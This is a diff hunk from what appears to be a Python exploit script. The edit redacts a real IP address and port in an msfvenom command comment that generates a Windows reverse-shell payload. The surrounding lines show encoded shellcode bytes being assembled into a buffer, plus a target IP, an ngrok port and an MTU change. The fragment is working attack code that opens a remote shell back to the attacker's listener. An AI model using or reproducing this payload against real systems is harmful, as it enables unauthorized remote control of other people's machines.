@@ -201,7 +201,7 @@ os.system("ifconfig eth0 mtu 3000")
 target_ip = "X.XXX.XX.XXX" # Remote machine IP
 port = int(XXXXX) #ngrok remote machine
 
-# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=3.22.53.161 LPORT=11954  -f python
+# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=X.XXX.XX.XXX LPORT=XXXXX  -f python
 buf =  b""
 buf += b"\xda\xd0\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49"
 buf += b"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51"
